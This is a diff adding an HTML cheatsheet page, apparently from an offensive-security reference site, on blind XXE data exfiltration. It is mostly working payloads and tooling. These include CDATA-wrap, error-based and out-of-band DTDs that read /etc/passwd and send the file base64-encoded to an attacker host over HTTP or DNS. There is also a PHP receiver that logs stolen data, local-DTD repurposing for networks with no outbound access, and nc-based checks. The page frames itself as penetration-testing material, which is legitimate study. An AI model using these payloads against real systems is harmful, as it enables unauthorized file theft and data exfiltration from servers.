@@ -1,0 +1,434 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Blind Exfil · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › XXE</nav><h1>Blind Exfil</h1><p class="cx-lede">When no entity content is reflected in the response - extract data via three out-of-band primitives. CDATA wrap with parameter entities for source-code reads through wrapper-incompatible parsers, error-based exfil that smuggles file content into parser error messages, and the full OOB HTTP exfil with a hosted DTD that receives base64-encoded file contents on the attacker&#x27;s listener.</p><div class="cx-tags"><span class="cx-tag">MITRE T1083, T1213, T1071.001</span><span class="cx-tag">D3FEND D3-IAA</span><span class="cx-tag">IMPACT FileRead, DataExfil, SourceCodeDisclosure</span><span class="cx-tag">OWASP A05</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>When the response doesn't echo entity content back, exfiltrate out-of-band. Three techniques in order of preference:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Path A - CDATA wrap with external parameter entities (when response IS reflected but
+#          XML special characters in the target file break the parse)
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY % begin &quot;&lt;![CDATA[&quot;&gt;
+  &lt;!ENTITY % file SYSTEM &quot;file:///var/www/html/index.php&quot;&gt;
+  &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;
+  &lt;!ENTITY % xxe SYSTEM &quot;http://attacker/xxe.dtd&quot;&gt;
+  %xxe;
+]&gt;
+&lt;root&gt;&lt;name&gt;&amp;joined;&lt;/name&gt;&lt;/root&gt;
+
+# Path B - Error-based (response doesn&#x27;t reflect, but parser errors leak)
+# attacker.dtd:
+&lt;!ENTITY % file SYSTEM &quot;file:///etc/hosts&quot;&gt;
+&lt;!ENTITY % error &quot;&lt;!ENTITY content SYSTEM &#x27;%nonExistent;/%file;&#x27;&gt;&quot;&gt;
+
+# Path C - Full out-of-band (no reflection, no errors - completely blind)
+# attacker.dtd:
+&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&gt;
+&lt;!ENTITY % oob &quot;&lt;!ENTITY exfil SYSTEM &#x27;http://attacker:8000/?c=%file;&#x27;&gt;&quot;&gt;
+%oob;
+# Then on target:
+&lt;!DOCTYPE foo [&lt;!ENTITY % remote SYSTEM &quot;http://attacker/x.dtd&quot;&gt;%remote;]&gt;
+&lt;root&gt;&amp;exfil;&lt;/root&gt;</code></pre></figure>
+<p>Success indicator: file contents (or its base64 encoding) arrive at the attacker's listener, embedded in a request URL.</p>
+<h2 id="why-blind-xxe-needs-special-tricks">Why blind XXE needs special tricks</h2>
+<p>The basic XXE payload fails for three distinct reasons:</p>
+<table>
+<thead>
+<tr>
+<th>Failure</th>
+<th>Reason</th>
+<th>Solution</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Entity content has <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code></td>
+<td>XML parser breaks on reserved characters</td>
+<td>CDATA wrap (Path A) or <code>php://filter/convert.base64-encode</code> (see <a href="../file-disclosure/index.html">File disclosure</a>)</td>
+</tr>
+<tr>
+<td>Response doesn't echo any entity</td>
+<td>App writes entity to DB / log only; never returns it</td>
+<td>Error-based or OOB (Paths B / C)</td>
+</tr>
+<tr>
+<td>App suppresses parser errors <em>and</em> doesn't echo entities</td>
+<td>Fully blind - no leaked signal at all</td>
+<td>OOB only (Path C)</td>
+</tr>
+</tbody>
+</table>
+<p>The progression: try direct reflection first, switch to CDATA wrap when content breaks the parse, escalate to error-based when nothing reflects but errors do, escalate to OOB when nothing leaks at all.</p>
+<h2 id="the-parameter-entity-workaround-for-joining">The parameter-entity workaround for joining</h2>
+<p>A fundamental XML quirk: <strong>general entities cannot reference external entities in their definitions when used inside the document</strong>. This breaks the obvious "wrap a file read with CDATA delimiters" attempt:</p>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;!-- This DOES NOT work - XML forbids joining external + internal here --&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY begin &quot;&lt;![CDATA[&quot;&gt;
+  &lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+  &lt;!ENTITY end &quot;]]&gt;&quot;&gt;
+  &lt;!ENTITY joined &quot;&amp;begin;&amp;file;&amp;end;&quot;&gt;
+]&gt;</code></pre></figure>
+<p>Parser error: entity references in entity definitions are restricted.</p>
+<p><strong>Parameter entities</strong> (prefixed <code>%</code>) don't have this restriction. They live in the DTD only, but they <em>can</em> be joined with other entities - internal or external - to produce a new general entity. The trick is to do the joining inside an external DTD that the parser loads via parameter entity, because <em>external</em> parameter entity contexts have looser rules.</p>
+<p>The pattern:</p>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;!-- Inside the external xxe.dtd, hosted by attacker --&gt;
+&lt;!ENTITY joined &quot;%begin;%file;%end;&quot;&gt;</code></pre></figure>
+<p>The <code>%begin;</code>, <code>%file;</code>, <code>%end;</code> are parameter entities expanded <em>within</em> the external DTD's context - where joining is allowed. The result is a normal entity <code>&amp;joined;</code> that the main document can reference.</p>
+<h2 id="path-a-cdata-wrap">Path A - CDATA wrap</h2>
+<p>For when the response reflects entity content, but the target file contains XML-reserved characters that break the parse.</p>
+<h3 id="step-1-create-the-external-dtd">Step 1 - Create the external DTD</h3>
+<p>On your attacker host, write <code>xxe.dtd</code>:</p>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;!ENTITY joined &quot;%begin;%file;%end;&quot;&gt;</code></pre></figure>
+<p>Serve it:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 ...</code></pre></figure>
+<h3 id="step-2-craft-the-in-app-payload">Step 2 - Craft the in-app payload</h3>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE email [
+  &lt;!ENTITY % begin &quot;&lt;![CDATA[&quot;&gt;
+  &lt;!ENTITY % file SYSTEM &quot;file:///var/www/html/submitDetails.php&quot;&gt;
+  &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;
+  &lt;!ENTITY % xxe SYSTEM &quot;http://attacker:8000/xxe.dtd&quot;&gt;
+  %xxe;
+]&gt;
+&lt;root&gt;
+  &lt;name&gt;&amp;joined;&lt;/name&gt;
+  &lt;email&gt;x&lt;/email&gt;
+&lt;/root&gt;</code></pre></figure>
+<p>How it executes:</p>
+<ol>
+<li>Parser sees <code>%xxe;</code> - fetches <code>http://attacker:8000/xxe.dtd</code></li>
+<li>xxe.dtd contents declare <code>&lt;!ENTITY joined "%begin;%file;%end;"&gt;</code></li>
+<li>The three parameter entities expand: begin → CDATA start, file → file contents, end → CDATA end</li>
+<li>The result is a general entity <code>joined</code> containing <code>&lt;![CDATA[ FILE_CONTENTS ]]&gt;</code></li>
+<li>Main document references <code>&amp;joined;</code> in the <code>&lt;name&gt;</code> field</li>
+<li>Response renders the CDATA-wrapped file contents - the wrap protects from <code>&lt;</code>/<code>&gt;</code>/<code>&amp;</code></li>
+</ol>
+<h3 id="step-3-observe-the-response">Step 3 - Observe the response</h3>
+<p>The reflected <code>&lt;name&gt;</code> field now contains the file contents inside <code>&lt;![CDATA[ ... ]]&gt;</code>. Browsers and Burp render the inner content as text. Copy it from the response and you have the source.</p>
+<h3 id="why-cdata-over-base64">Why CDATA over base64</h3>
+<p>CDATA is more efficient when it works - the file appears in plain text, no decode step. But CDATA wrap fails when:</p>
+<ul>
+<li>The file itself contains <code>]]&gt;</code> (rare but possible, especially in XML files about XML)</li>
+<li>The parser disables external DTD loading</li>
+<li>The wrap leaves a leading/trailing newline that the parser doesn't like</li>
+</ul>
+<p>When CDATA wrap fails, fall back to base64 via <code>php://filter/convert.base64-encode</code> (see <a href="../file-disclosure/index.html">File disclosure</a>) - it's more verbose but more reliable.</p>
+<h2 id="path-b-error-based-exfil">Path B - Error-based exfil</h2>
+<p>When the application echoes parser errors but doesn't reflect entity content directly:</p>
+<h3 id="step-1-confirm-errors-are-echoed">Step 1 - Confirm errors are echoed</h3>
+<p>Send a deliberately broken XML:</p>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;root&gt;
+  &lt;unclosed_tag
+&lt;/root&gt;</code></pre></figure>
+<p>Or reference an entity that doesn't exist:</p>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;!DOCTYPE foo [&lt;!ENTITY x SYSTEM &quot;this is not a valid url&quot;&gt;]&gt;
+&lt;root&gt;&lt;name&gt;&amp;x;&lt;/name&gt;&lt;/root&gt;</code></pre></figure>
+<p>If the response is an XML parser error message containing context - file paths, line numbers, library names - error-based exfil works.</p>
+<h3 id="step-2-create-the-error-triggering-dtd">Step 2 - Create the error-triggering DTD</h3>
+<p><code>xxe.dtd</code> on your host:</p>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;!ENTITY % file SYSTEM &quot;file:///etc/hosts&quot;&gt;
+&lt;!ENTITY % error &quot;&lt;!ENTITY content SYSTEM &#x27;%nonExistent;/%file;&#x27;&gt;&quot;&gt;
+%error;</code></pre></figure>
+<p>The <code>%nonExistent;</code> is a deliberately undefined parameter entity. When the parser tries to expand it, it fails - and most parsers include the surrounding context in the error message, which includes the value of <code>%file;</code> (the contents of <code>/etc/hosts</code>).</p>
+<h3 id="step-3-trigger-from-the-app">Step 3 - Trigger from the app</h3>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE root [
+  &lt;!ENTITY % remote SYSTEM &quot;http://attacker:8000/xxe.dtd&quot;&gt;
+  %remote;
+  %error;
+]&gt;
+&lt;root&gt;x&lt;/root&gt;</code></pre></figure>
+<p>The parser:</p>
+<ol>
+<li>Fetches <code>xxe.dtd</code></li>
+<li>Loads <code>%file;</code> (reads /etc/hosts)</li>
+<li>Tries to define <code>content</code> entity with bad expansion</li>
+<li>Fails - error message includes the bad URI which contains the file content</li>
+</ol>
+<p>Response:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>PHP Warning: Failed to load external entity &quot;/127.0.0.1 localhost
+::1     localhost ip6-localhost ip6-loopback
+...
+&quot;</code></pre></figure>
+<p>The file content appears between path-component delimiters in the error message. Parse it out.</p>
+<h3 id="limitations">Limitations</h3>
+<p>Error-based exfil has constraints:</p>
+<ul>
+<li><strong>Length-limited</strong>: error messages truncate at some implementation limit (4KB-16KB typically). Files larger than that get cut off.</li>
+<li><strong>Encoding-sensitive</strong>: some characters in the file may break the error message format. Wrap with <code>php://filter/convert.base64-encode</code> to neutralize:</li>
+</ul>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/hosts&quot;&gt;</code></pre></figure>
+<ul>
+<li><strong>Per-line vs whole-file</strong>: some parsers only include the first line of the file in the error. Test with a multi-line file (<code>/etc/passwd</code>) to check.</li>
+</ul>
+<p>When error-based is too constrained, escalate to fully OOB (Path C).</p>
+<h2 id="path-c-full-out-of-band-http-exfil">Path C - Full out-of-band HTTP exfil</h2>
+<p>The most general case: no reflection, no errors echoed. Exfiltrate by making the parser issue an HTTP request to attacker's server with the file content in the URL.</p>
+<h3 id="step-1-build-the-receiver">Step 1 - Build the receiver</h3>
+<p>A minimal PHP receiver that logs everything and decodes the content:</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">&lt;?php
+// index.php - receives XXE exfil callbacks
+if (isset($_GET[&#x27;c&#x27;])) {
+    $decoded = base64_decode($_GET[&#x27;c&#x27;]);
+    $logfile = &#x27;/tmp/xxe-exfil.log&#x27;;
+    file_put_contents($logfile,
+        date(&#x27;Y-m-d H:i:s&#x27;) . &quot; from &quot; . $_SERVER[&#x27;REMOTE_ADDR&#x27;] . &quot;\n&quot; .
+        &quot;Raw: &quot; . $_GET[&#x27;c&#x27;] . &quot;\n&quot; .
+        &quot;Decoded:\n&quot; . $decoded . &quot;\n\n&quot;,
+        FILE_APPEND);
+    error_log(&quot;=== EXFIL ===\n&quot; . $decoded . &quot;\n=============&quot;);
+}
+?&gt;</code></pre></figure>
+<p>Run it:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">$ php -S 0.0.0.0:8000
+[Mon Sep 30 14:23:00 2024] PHP 8.1.0 Development Server (http://0.0.0.0:8000) started</code></pre></figure>
+<h3 id="step-2-create-the-oob-dtd">Step 2 - Create the OOB DTD</h3>
+<p><code>xxe.dtd</code>:</p>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&gt;
+&lt;!ENTITY % oob &quot;&lt;!ENTITY exfil SYSTEM &#x27;http://attacker:8000/?c=%file;&#x27;&gt;&quot;&gt;
+%oob;</code></pre></figure>
+<p>The <code>%file;</code> parameter entity reads the target file as base64. The <code>%oob;</code> parameter entity defines a <em>new</em> general entity <code>exfil</code> whose SYSTEM URI includes the base64 content as a query parameter.</p>
+<p>When <code>%oob;</code> is expanded (and then the parser sees the new <code>exfil</code> general entity), defining <code>exfil</code> requires resolving its SYSTEM URI - which makes an HTTP request to the attacker, with the file content embedded.</p>
+<h3 id="step-3-trigger-from-the-app_1">Step 3 - Trigger from the app</h3>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE root [
+  &lt;!ENTITY % remote SYSTEM &quot;http://attacker:8000/xxe.dtd&quot;&gt;
+  %remote;
+  %oob;
+]&gt;
+&lt;root&gt;&amp;exfil;&lt;/root&gt;</code></pre></figure>
+<p>The parser:</p>
+<ol>
+<li>Sees <code>%remote;</code> - fetches <code>http://attacker:8000/xxe.dtd</code></li>
+<li>xxe.dtd defines <code>%file;</code> (reads /etc/passwd encoded) and <code>%oob;</code> (defines <code>exfil</code>)</li>
+<li><code>%oob;</code> expansion finalizes the <code>exfil</code> general entity definition</li>
+<li><code>&lt;root&gt;&amp;exfil;&lt;/root&gt;</code> references it - parser resolves by HTTP-fetching <code>http://attacker:8000/?c=BASE64_FILE_CONTENT</code></li>
+<li>Your receiver logs the base64-encoded file contents</li>
+</ol>
+<h3 id="step-4-read-the-logs">Step 4 - Read the logs</h3>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">$ tail -f /tmp/xxe-exfil.log
+2024-09-30 14:25:13 from 10.10.10.42
+Raw: cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDox...
+Decoded:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...</code></pre></figure>
+<p>The full /etc/passwd arrived on the attacker's listener.</p>
+<h3 id="why-base64-in-the-url">Why base64 in the URL</h3>
+<p>Files almost always contain characters that aren't URL-safe (<code>#</code>, <code>?</code>, <code>&amp;</code>, <code>=</code>, newlines, special bytes). Without base64 encoding, the file content would be truncated by the URL parser at the first reserved character - usually a <code>?</code> or <code>#</code> in the middle of a config file would lose everything after.</p>
+<p>Base64 uses only <code>A-Za-z0-9+/=</code>. Of those, <code>+</code> and <code>/</code> aren't URL-safe but the receiver's URL parser handles them in query parameters. <code>=</code> is fine in values.</p>
+<p>For maximum reliability, use <code>convert.base64-encode</code> for every file you exfiltrate - even plain-text ones.</p>
+<h2 id="dns-based-oob-when-http-is-blocked">DNS-based OOB (when HTTP is blocked)</h2>
+<p>When the target's network egress blocks outbound HTTP but allows DNS (very common - DNS is rarely firewalled because it would break the internet):</p>
+<h3 id="step-1-set-up-a-dns-receiving-listener">Step 1 - Set up a DNS-receiving listener</h3>
+<p>Use Interactsh, Burp Collaborator, or run your own authoritative DNS for a domain:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># Interactsh client
+$ interactsh-client
+[xx.xx.xx.xx] Got DNS interaction from cm9vdDp4OjA6MDpyb290.xyz.oast.live</code></pre></figure>
+<h3 id="step-2-modify-the-dtd-to-use-dns-only">Step 2 - Modify the DTD to use DNS-only</h3>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/hostname&quot;&gt;
+&lt;!ENTITY % oob &quot;&lt;!ENTITY exfil SYSTEM &#x27;http://%file;.xyz.oast.live/&#x27;&gt;&quot;&gt;
+%oob;</code></pre></figure>
+<p>The base64-encoded file content becomes a subdomain. The DNS lookup for <code>BASE64CONTENT.xyz.oast.live</code> arrives at Interactsh's DNS server even when HTTP can't.</p>
+<h3 id="step-3-length-limitations">Step 3 - Length limitations</h3>
+<p>DNS subdomains are limited:</p>
+<ul>
+<li>Each label (between dots): 63 bytes</li>
+<li>Full domain: 253 bytes</li>
+<li>Practical operating limit: about 50-60 base64 chars per query</li>
+</ul>
+<p>For files larger than this, you need to slice the file and exfiltrate in multiple queries, with parameter entity manipulation to extract substrings. The standard trick:</p>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;&gt;
+&lt;!ENTITY % start &quot;0&quot;&gt;
+&lt;!ENTITY % oob &quot;&lt;!ENTITY exfil SYSTEM &#x27;http://%file_chunk_1;.attacker.com/&#x27;&gt;&quot;&gt;</code></pre></figure>
+<p>In practice, automating multi-chunk DNS exfil is what tools like XXEinjector handle - see <a href="../automation/index.html">Automation</a>.</p>
+<h2 id="path-d-repurpose-a-local-dtd-no-outbound-at-all">Path D - Repurpose a local DTD (no outbound at all)</h2>
+<p>Paths A–C all need the parser to fetch <em>your</em> external DTD, and the DNS path needs at least name resolution to leave the network. When the target has <strong>no outbound connectivity whatsoever</strong> - firewalled egress, air-gapped backend - but DOCTYPE and parameter entities are still allowed and errors are echoed, you can still get error-based exfil by <strong>reusing a DTD file already on the target's disk</strong>.</p>
+<p>The idea: load a known local DTD with a parameter entity, then <em>redefine</em> one of the parameter entities that DTD itself declares, so your redefinition injects the error-triggering chain. No network leaves the box - the only "external" reference is a <code>file://</code> to a DTD that's already there.</p>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;!DOCTYPE foo [
+  &lt;!-- 1. Pull in a DTD known to exist on the target --&gt;
+  &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;
+
+  &lt;!-- 2. Redefine an entity THAT DTD defines (ISOamso), smuggling the exfil chain --&gt;
+  &lt;!ENTITY % ISOamso &#x27;
+    &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+    &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;
+    &amp;#x25;eval;
+    &amp;#x25;error;
+  &#x27;&gt;
+
+  &lt;!-- 3. Load the local DTD, which now expands our redefined ISOamso --&gt;
+  %local_dtd;
+]&gt;
+&lt;foo&gt;bar&lt;/foo&gt;</code></pre></figure>
+<p>When <code>%local_dtd;</code> is processed, the parser expands the redefined <code>ISOamso</code>, which reads <code>/etc/passwd</code> and references it inside a <code>SYSTEM</code> path to a nonexistent file - the resulting "file not found" <strong>error message contains the file contents</strong>, exactly like <a href="#path-b---error-based-exfil">Path B</a> but with no DTD of yours ever fetched over the network.</p>
+<h3 id="finding-a-local-dtd">Finding a local DTD</h3>
+<p>You need a DTD file that exists on the target and the name of a parameter entity it declares. Brute-force a shortlist of common ones (and read the DTD first via <a href="../file-disclosure/index.html">file disclosure</a> if you already have read primitives, to confirm the entity name):</p>
+<table>
+<thead>
+<tr>
+<th>Path</th>
+<th>Platform</th>
+<th>Entity to redefine</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/usr/share/yelp/dtd/docbookx.dtd</code></td>
+<td>Linux (GNOME/yelp)</td>
+<td><code>ISOamso</code></td>
+</tr>
+<tr>
+<td><code>/usr/share/xml/fontconfig/fonts.dtd</code></td>
+<td>Linux (fontconfig)</td>
+<td><code>constant</code> under some versions</td>
+</tr>
+<tr>
+<td><code>/opt/IBM/WebSphere/.../*.dtd</code></td>
+<td>Java appservers</td>
+<td>varies</td>
+</tr>
+<tr>
+<td><code>C:\Windows\System32\wbem\xml\cim20.dtd</code></td>
+<td>Windows</td>
+<td><code>SuperClass</code></td>
+</tr>
+</tbody>
+</table>
+<p>Confirm the entity name matches the DTD version on the target - a wrong entity name just fails silently. This technique is error-based, so it also requires that parser errors are returned to you (see Path B's prerequisites).</p>
+<h2 id="order-of-operations-debugging">Order of operations debugging</h2>
+<p>XXE blind exfil chains have many moving parts. When it doesn't work:</p>
+<h3 id="check-1-outbound-connectivity">Check 1 - Outbound connectivity</h3>
+<p>Does the target's parser actually reach your listener?</p>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM &quot;http://attacker:8000/test&quot;&gt;
+]&gt;
+&lt;root&gt;&amp;xxe;&lt;/root&gt;</code></pre></figure>
+<p>Run a simple HTTP listener (<code>nc -nlvp 8000</code>). If <code>GET /test</code> arrives, basic XXE-to-HTTP works. If not:</p>
+<ul>
+<li>Target's network blocks outbound HTTP</li>
+<li>Parser doesn't resolve <code>http://</code> URIs</li>
+<li>The XXE itself isn't firing - go back to <a href="../identifying/index.html">Identifying</a></li>
+</ul>
+<h3 id="check-2-parameter-entity-loading">Check 2 - Parameter entity loading</h3>
+<p>Once basic outbound works, test parameter entity loading:</p>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY % remote SYSTEM &quot;http://attacker:8000/test.dtd&quot;&gt;
+  %remote;
+]&gt;
+&lt;root&gt;x&lt;/root&gt;</code></pre></figure>
+<p>Your listener should see <code>GET /test.dtd</code>. If not, the parser disables parameter entity loading - a hardening setting that blocks blind XXE entirely. No bypass for this case via OOB.</p>
+<h3 id="check-3-dtd-parsing">Check 3 - DTD parsing</h3>
+<p>Once the DTD is being loaded, confirm the parser is <em>parsing</em> its content. Put a deliberate syntax error in the DTD:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&lt;!ENTITY % broken &quot;&lt;!ENTITY...&quot;&gt;&gt;&gt;&gt;</code></pre></figure>
+<p>If the response shows an XML parser error, the DTD is being parsed. If no error, the DTD is being fetched but discarded (some parsers disable external DTD effects while still fetching them for legacy reasons).</p>
+<h3 id="check-4-entity-reference">Check 4 - Entity reference</h3>
+<p>If the DTD parses and entities load, confirm the final entity reference is firing:</p>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;!-- xxe.dtd --&gt;
+&lt;!ENTITY exfil SYSTEM &quot;http://attacker:8000/exfil-fired&quot;&gt;</code></pre></figure>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;!-- in-app payload --&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY % remote SYSTEM &quot;http://attacker:8000/xxe.dtd&quot;&gt;%remote;]&gt;
+&lt;root&gt;&amp;exfil;&lt;/root&gt;</code></pre></figure>
+<p>If <code>GET /exfil-fired</code> arrives, full chain works. If only <code>GET /xxe.dtd</code> arrives but never <code>/exfil-fired</code>, the parser is loading parameter entities but blocking general-entity HTTP reference. Fall back to error-based (Path B).</p>
+<h2 id="when-everything-fails">When everything fails</h2>
+<p>Some parsers truly block all blind XXE primitives:</p>
+<ul>
+<li>External entities disabled entirely (libxml2's <code>XML_PARSE_NOENT</code> cleared)</li>
+<li>Parameter entities disabled</li>
+<li>DOCTYPE rejected at the application layer</li>
+</ul>
+<p>First rule out the "no egress" case: if DOCTYPE and parameter entities still work and only <em>outbound network</em> is blocked, you haven't failed - use <a href="#path-d---repurpose-a-local-dtd-no-outbound-at-all">Path D</a>, which needs no network at all. Pivot only when the primitives above are genuinely disabled:</p>
+<ul>
+<li><strong>Find another XML surface</strong>: a SOAP endpoint, an admin API, a file-upload that processes XML internally</li>
+<li><strong>Find another vulnerability class</strong>: if XML parsing is locked down, look for SSRF, command injection, file upload - XXE is one path of many</li>
+<li><strong>Re-read <a href="../identifying/index.html">Identifying</a></strong> to test alternate XML entry points</li>
+</ul>
+<h2 id="quick-reference">Quick reference</h2>
+<table>
+<thead>
+<tr>
+<th>Path</th>
+<th>Use when</th>
+<th>Listener requirement</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CDATA wrap</td>
+<td>Response reflects entity content but file has <code>&lt;</code>/<code>&gt;</code>/<code>&amp;</code></td>
+<td>Just a static DTD hoster (<code>python3 -m http.server</code>)</td>
+</tr>
+<tr>
+<td>Error-based</td>
+<td>Response doesn't reflect but parser errors echo</td>
+<td>Static DTD hoster</td>
+</tr>
+<tr>
+<td>Full OOB HTTP</td>
+<td>No reflection, no error echo</td>
+<td>Active HTTP listener (PHP script, nc, Interactsh)</td>
+</tr>
+<tr>
+<td>DNS OOB</td>
+<td>HTTP egress blocked</td>
+<td>DNS server (Interactsh, Burp Collaborator, custom auth DNS)</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>Task</th>
+<th>Pattern</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CDATA wrapper DTD</td>
+<td><code>&lt;!ENTITY joined "%begin;%file;%end;"&gt;</code></td>
+</tr>
+<tr>
+<td>In-app for CDATA wrap</td>
+<td>Declare <code>%begin;</code>, <code>%file;</code>, <code>%end;</code>, <code>%xxe;</code> params; reference <code>%xxe;</code> then <code>&amp;joined;</code></td>
+</tr>
+<tr>
+<td>Error-based DTD</td>
+<td><code>&lt;!ENTITY % error "&lt;!ENTITY content SYSTEM '%nonExistent;/%file;'&gt;"&gt;</code></td>
+</tr>
+<tr>
+<td>OOB DTD</td>
+<td><code>&lt;!ENTITY % oob "&lt;!ENTITY exfil SYSTEM 'http://A:8000/?c=%file;'&gt;"&gt;</code></td>
+</tr>
+<tr>
+<td>PHP receiver</td>
+<td><code>&lt;?php file_put_contents('/tmp/log', base64_decode($_GET['c'])); ?&gt;</code></td>
+</tr>
+<tr>
+<td>DNS-only OOB</td>
+<td>Replace <code>http://A:8000/?c=%file;</code> with <code>http://%file;.oast.live/</code></td>
+</tr>
+<tr>
+<td>Test basic outbound</td>
+<td>Simple <code>&lt;!ENTITY xxe SYSTEM "http://A:8000/test"&gt;</code></td>
+</tr>
+<tr>
+<td>Test parameter entity load</td>
+<td><code>&lt;!ENTITY % remote SYSTEM "http://A/test.dtd"&gt; %remote;</code></td>
+</tr>
+<tr>
+<td>Base64-encode file in DTD</td>
+<td><code>&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=PATH"&gt;</code></td>
+</tr>
+<tr>
+<td>Decode on receiver</td>
+<td><code>base64_decode($_GET['c'])</code> (PHP) or <code>echo VALUE \| base64 -d</code></td>
+</tr>
+</tbody>
+</table>
+<p>For the post-disclosure escalation paths - turning XXE into RCE or SSRF - see <a href="../rce-and-ssrf/index.html">RCE and SSRF</a>. For tool-driven automation of the blind techniques, see <a href="../automation/index.html">Automation</a>.</p></article><nav class="cx-pager"><a class="cx-prev" href="../file-disclosure/index.html">Previous: File Disclosure</a><a class="cx-next" href="../rce-and-ssrf/index.html">Next: RCE and SSRF</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
